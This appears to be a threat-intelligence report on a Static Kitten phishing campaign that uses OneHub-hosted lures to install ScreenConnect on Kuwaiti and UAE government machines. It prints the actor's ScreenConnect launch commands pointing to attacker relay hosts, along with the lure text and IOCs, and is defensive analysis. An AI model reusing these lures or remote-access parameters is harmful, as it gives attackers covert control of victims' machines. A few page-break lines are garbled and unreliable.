We found\nsamples specifically masquerading as the Kuwaiti government and the UAE National Council respectively, based on references in the\nmalicious samples.\n\nIn mid-2020, the UAE and Israel began the process of normalizing relations. Since then, tensions have further escalated in the region, as\nreported by numerous sources. The targeting of Kuwait could be tied to multiple factors, including Kuwait’s MOFA making a public statement\nthat they were willing to lead mediation between Iran and Saudi Arabia.[3] Furthermore, in October 2020, trade numbers for a peace deal\nbetween Israel and UAE included an estimate for the creation of 15,000 jobs and $2 billion in revenue on each side.[4] In that same month,\nStatic Kitten reportedly conducted Operation Quicksand, which targeted prominent Israeli organizations and included the use of file-storage\nservice OneHub.[5]\n\n\n## Details\n\nWe identified two lure ZIP files being used by Static Kitten designed to trick users into downloading a purported report on relations between\nArab countries and Israel, or a file relating to scholarships. The URLs distributed through these phishing emails direct recipients to the\nintended file storage location on Onehub, a legitimate service known to be used by Static Kitten for nefarious purposes.[6] Anomali Threat\nResearch has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.\n\nThe delivery URLs found to be part of this campaign are:\n\nws.onehub[.]com/files/7w1372el\nws.onehub[.]com/files/94otjyvd\n\nFile names in this campaign include:\n\nﺗﺤﻠﯿﻞ ودراﺳﺔ ﺗﻄﺒﯿﻊ اﻟﻌﻼﻗﺎت اﻟﺪول اﻟﻌﺮﺑﯿﺔ واﺳﺮاﺋﯿﻞ httpsmod[.]gov.kw.ZIP\nﺗﺤﻠﯿﻞ ودراﺳﺔ ﺗﻄﺒﯿﻊ اﻟﻌﻼﻗﺎت اﻟﺪول اﻟﻌﺮﺑﯿﺔ واﺳﺮاﺋﯿﻞ httpsmod[.]gov.kw.exe\nاﻟﺪراﺳﯿﺔ .zip\nاﻟﺪراﺳﯿﺔ .exe\nﻣﺸﺮوع .docx\n\nTranslated file names\n\nAnalysis and study of the normalization of relations between the Arab countries and Israel httpsmod.gov.kw.zip\nAnalysis and study of the normalization of relations between the Arab countries and Israel httpsmod.gov.kw.exe\nScholarships.zip\nScholarships.exe\nProject.docx\n\nStatic Kitten’s objective is to direct users to a downloader URL (ws.onehub[.]com/files/7w1372el which downloads a ZIP file) via a phishing\nemail that impersonates an EXE (ﺗﺤﻠﯿﻞ ودراﺳﺔ ﺗﻄﺒﯿﻊ اﻟﻌﻼﻗﺎت اﻟﺪول اﻟﻌﺮﺑﯿﺔ واﺳﺮاﺋﯿﻞ httpsmod[.]gov.kw.exe). This EXE purports to be a report on\nArabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.\n\n\n-----\n\ns a seco d sa p e uses doc e t at t es to d ect use s to **s o e ub[ ]co** **/** **es/9 otjy d** c do oads a e ca ed **ﯿ** **ر**\n**.zip. An EXE inside the ZIP of the same name will also begin the ScreenConnect installation process when executed. An overview of the**\ninfection chain is shown in Figure 1below.\n\n**_Figure 1 - Static Kitten Campaign Infection Chain_**\n\n### Lure Document Analysis\n\nStatic Kitten is distributing at least two URLs that deliver two different ZIP files that are themed to be relevant to government agency\nemployees. The URLs are distributed through phishing emails with lure and decoy documents. An example lure is shown in Figure 2 below.\n\n**_Figure 2 – Static Kitten Lure Document .docx_**\n\nThe .docx file shown in Figure 2 directly refers to government agency recipients while highlighting concerns about recent Iranian actions, the\nimpact of the US elections, and joint studies by government entities on relations between Arabic countries and Israel. The actors reference\nmultiple official agencies, including the General Secretariat of the Cooperation Council for the Arab States of the Gulf and the UAE National\nMedia Council, likely in an effort to add the appearance of legitimacy. A full translation of this document can be viewed in Appendix A. The\nhyperlink in the .docx file is impersonating the UAE National Media Council, however, the actual link directs to\n**ws.onehub.com/files/7w1372el.**\n\n\n-----\n\ne seco d e s a ca edرﯿp (see gu e 3) e ca ot dete e t e de e y et od o t s, but t s e y s a to t e\n.docx email delivery method of the first download URL. The geopolitical-themed ZIP contains an EXE file with the same name that begins the\ninstallation process for ScreenConnect when executed (see Figure 4).\n\n**_Figure 3 – Download URL ws.onehub.com/files/94otjyvd for Malicious ZIP اﻟﺪراﺳﯿﺔ .zip_**\n\n**_Figure 4 - ScreenConnect Installation_**\n\n## Technical Analysis\n\n### ScreenConnect and OneHub Context\n\nBetween 2016 and 2020, we have seenScreenConnect and Onehub used in malicious cyber activity by different, unassociated threat actors.\nFor example, between 2016 and 2019 unknown threat actors targeted IT outsourcing firms, including compromising US-based Cognizant and\nIndia-based Wipro.[7] The actors responsible for these attacks used ScreenConnect to connect to endpoints on client networks, enabling them\nto conduct further lateral movements and automated actions on objectives. During an incident impacting Cognizant and their client Maritz\nHoldings, actors used ScreenConnect to propagate to other connected systems and caused over $1.8 million (USD) in losses through a gift\ncard fraud scheme.[6] In 2019, another threat group used ConnectWise to execute PowerShell commands in their target environments. This\nlead to the delivery of Zeppelin and other VegaLocker ransomware variants, Vidar information stealer, Cobalt Strike beacons, PS2EXE tools,\nand banker Trojans.[7] In 2020, ScreenConnect/ConnectWise has been utilized by the cybercriminal group Pinchy Spider (GOLD\nSOUTHFIELD, GOLD GARDEN, Sodinokibi, REvil, GandCrab) to distribute Sodinokibi ransomware.[8]\n\nRemote desktop management software is a common target and tool used by threat actors because of the wide variety of functionalities they\noffer. ScreenConnect offers three primary functions that each contain different valuable features for threat actors. ScreenConnect’s\ncapabilities are shown in Table 1 below.\n\n\n**_Table 1 - ScreenConnect Capabilities_**\n\n**Feature** **Functions**\n\n\n\n[9]\n\n\nRemote Support Remote control and viewing of any internet-connect device.\n\nUnattended Access Persistent connection allows behind-the-scenes, remote control of any machine or server.\n\nMeetings Standard screen-sharing meetings with chat and voice communication, record video, and take screenshots.\n\n\n-----\n\ne cybe c a g oup G ace u Sp de ( 505, Go d e g ee, a oc, e0065, C bo a o, ) d st buted spea p s g\nemails impersonating Onehub in 2019 in attempts to trick users into downloading the SDBbot remote access trojan (RAT).[10] Onehub’s filestorage services are also utilized in malspam emails to host various malware, as is common with other file storage locations abused by\nmultiple threat actors.\n\n### First Executable\n\nﺗﺤﻠﯿﻞ ودراﺳﺔ ﺗﻄﺒﯿﻊ اﻟﻌﻼﻗﺎت اﻟﺪول اﻟﻌﺮﺑﯿﺔ واﺳﺮاﺋﯿﻞ httpsmod.gov.kw.exe\n\nWhen a user tries to double click the executable ﺗﺤﻠﯿﻞ ودراﺳﺔ ﺗﻄﺒﯿﻊ اﻟﻌﻼﻗﺎت اﻟﺪول اﻟﻌﺮﺑﯿﺔ واﺳﺮاﺋﯿﻞ httpsmod.gov.kw.exe (Screenconnect payload), it\ndrops the Microsoft installer file. This begins the installation of the client payload onto victim machines. While the actors attempted to make\nthe installation appear legitimate, closer inspection of the client launch parameters reveals the potential for broader MOFA targeting. The\nclient service launch parameters are:\n\n\"C:\\Program Files (x86)\\ScreenConnect Client (a97eeae2330a1851)\\ScreenConnect.ClientService.exe\" \"?e=Access&y=Guest&h=instanceuwct38-relay.screenconnect.com&p=443&s=defc756e-8027-47b6-b67f400b5152b0f9&k=BgIAAACkAABSU0ExAAgAAAEAAQAtuFTxmBL02KmPrJD46iRMPemIxmEf5ugjlUMfa193CjLMeH9pna2eM0ZGHYhe3MZHU\n\nWhile the ScreenConnectclient agent is being installed, the server component expects a connection and the server can identify the client\nagent through a public key thumbprint. The thumbprint is a 16 character string located at \"C:\\Program Files (x86)\\ScreenConnect Client\n(a97eeae2330a1851)”\n\nAnalysis of the authentic launch parameters passed back to the server as part of Screenconnect functionality is shown in Table 2 below.\n\n**_Table 2 - ScreenConnect Launch Parameters_**\n\n**Launch Parameter**\n\ne=Access\n\ny=Guest\n\nh=instance-sy9at2-relay.screenconnect.com\n\np=443\n\ns=6a1e6739-ad4f-4759-8c69-dfe896b9a817\n\nk=BgIAAACkAABSU0ExAAgAAAEAAQCVzMmjXhdfu5xyqTHPWDSj9Qjbq%2bQlIQursvinhHWO9UWKiTPrrR7quzVCpids4AagFWBCbS6cfow4\n\n&t\n\nThe main launch parameter that indicates this EXE is designed to target MOFAs are the custom c parameters:\n\n&c=mofa\n&c=mofa.gov.kw\n\nThese parameters contain predefined properties that can allow an actor to know which target, or from where, has been infected. In this\nexample the infected target is MOFA.\n\n### Second Executable\n\nاﻟﻤﻨﺢ اﻟﺪراﺳﯿﺔ .exe\n\n\n-----\n\ne Sc ee Co ect au c pa a ete s oرﯿ ﺢe e s s o be o\n\n\"C:\\Program Files (x86)\\ScreenConnect Client (03b9d0ec9210f109)\\ScreenConnect.ClientService.exe\" \"?e=Access&y=Guest&h=instancesy9at2-relay.screenconnect.com&p=443&s=6a1e6739-ad4f-4759-8c69dfe896b9a817&k=BgIAAACkAABSU0ExAAgAAAEAAQCVzMmjXhdfu5xyqTHPWDSj9Qjbq%2bQlIQursvinhHWO9UWKiTPrrR7quzVCpids4AagF\n\nThe actors again created a custom field parameter, however, this one is kept to a generic MOFA targeting that appears as MFA:\n\n&c=mfa&c=mfa.gov\n\n## Conclusion\n\nUtilizing legitimate software for malicious purposes can be an effective way for threat actors to obfuscate their operations. In this latest\nexample, Static Kitten is very likely using features of ScreenConnect to steal sensitive information or download malware for additional cyber\noperations. As Static Kitten is assessed to be primarily focused on cyberespionage, it is very likely that data-theft is the primary objective\nbehind propagating ScreenConnect to government agency employees.\n\nWe will continue monitoring this group for additional malicious activity and provide details when appropriate.\n\n## MITRE TTPs\n\nMasquerading - T1036\nPhishing - T1566\nRemote Access Software - T1219\nSpearphishing Attachment - T1566.001\nSpearphishing Link - T1566.002\nUser Execution - T1204\nUser Execution: Malicious File - T1204.002\n\n## Endnotes\n\n[1] ClearSky Cyber Security, “Operation Quicksand: Muddywater’s Offensive Attack Against Israeli Organizations,” ClearSky, accessed\n\nFebruary 8, 2021, published October 2020, https://www.clearskysec.com/wp-content/uploads/2020/10/Operation-Quicksand.pdf, 3.\n\n\n\n[2] MuddyWater,” MITRE, accessed February 8, 2021 https://attack.mitre.org/groups/G0069/.\n\n[3] “Kuwait willing to mediate between Iran and Saudi,” Middle East Monitor, accessed February 8, 2021, published February 4, 2021,\n\nhttps://www.middleeastmonitor.com/20210204-kuwait-willing-to-mediate-between-iran-and-saudi/.\n\n\n\n[4] Attila Shumelby, “Intelligence Minister Eli Cohen: Netanyahu secretly visited other countries besides the Emirates,” Ynet, accessed\n\nFebruary 8, 2021, published, September 9, 2020, https://www.ynet.co.il/news/article/S1v00IFsXP; Jonathan Josephs, “Israel-UAE peace deal\n‘big’ for trade in Middle East,” BBC News, accessed February 8, 2021, published October 16, 2020, https://www.bbc.com/news/business54574022.\n\n[5] ClearSky Cyber Security, “Operation Quicksand: Muddywater’s Offensive Attack Against Israeli Organizations,” ClearSky, 23.\n\n\n\n[6] Ibid.\n\n[7] “Wipro Intruders Targeted Other Major IT Firms,” KrebsOnSecurity, accessed February 8, 2021, published April 18, 2019,\n\nhttps://krebsonsecurity.com/2019/04/wipro-intruders-targeted-other-major-it-firms/#more-47453.\n\n\n\n[8] Ibid.\n\n[8] Alon Groisman, “Connectwise Control Abused Again to Deliver Zeppelin Ransomware,” Morphisec Blog, accessed February 8, 2021,\n\npublished December 18, 2019, https://blog.morphisec.com/connectwise-control-abused-again-to-deliver-zeppelin-ransomware.\n\n\n\n[9] “CAUSE AND EFFECT: SODINOKIBI RANSOMWARE ANALYSIS,” Tetra Defense, accessed February 8, 2021,\n\nhttps://www.tetradefense.com/incident-response-services/cause-and-effect-sodinokibi-ransomware-analysis/.\n\n[9] “Now Let’s Get Tech-y: ScreenConnect’s three main product components create a trio of powerful remote functionality,” ConnectWise\n\nControl, accessed February 8, 2021, https://www.screenconnect.com/Remote-Support?\nt=2&t=2#:~:text=ScreenConnect%20is%20a%20fully%20functional,remote%20support%20on%20the%20fly.\n\n\n\n[10] Dennis Schwarz, et al., “TA505 Distributeds New SDBbot Remote Access Trojan with Get2 Downloader, Proofpoint, accessed February 8,\n\n2021, published October 16, 2019, https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojanget2-downloader.\n\n## IOCs\n\n\n-----\n\n**oc**\n31a35e3b87a7f81449d6f3e195dc0660b5dae4ac5b7cd9a65a449526e8fb7535\n\n**EXE**\n3e4e179a7a6718eedf36608bd7130b62a5a464ac301a211c3c8e37c7e4b0b32b\n5bfb635c43eb73f25f4e75961a715b96fa764bbe096086fc1e037a7869c7878b\n\n**IP**\n149.202.216.53\n\n**URL**\nhttps://ws.onehub.com/files/94otjyvd\nhttps://ws.onehub.com/files/7w1372el\ninstance-sy9at2-relay.screenconnect.com\ninstance-uwct38-relay.screenconnect.com\n\n**ZIP**\nb2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf\n77505dcec5d67cc0f6eb841f50da7e7c41a69419d50dc6ce17fffc48387452e1\n\n## Appendix A\n\nGentlemen / employees of government agencies\n\nHappy New Year\n\nAfter a kind greeting,,,\n\nIn view of the situation in the region, especially after the US elections, and concerns about Iran's actions, joint studies have been conducted\nbetween the National Media Council and the General Secretariat of the Cooperation Council for the Arab States of the Gulf on counting the\npolitical, security and economic consequences of the normalization of relations between Arab countries and Israel.
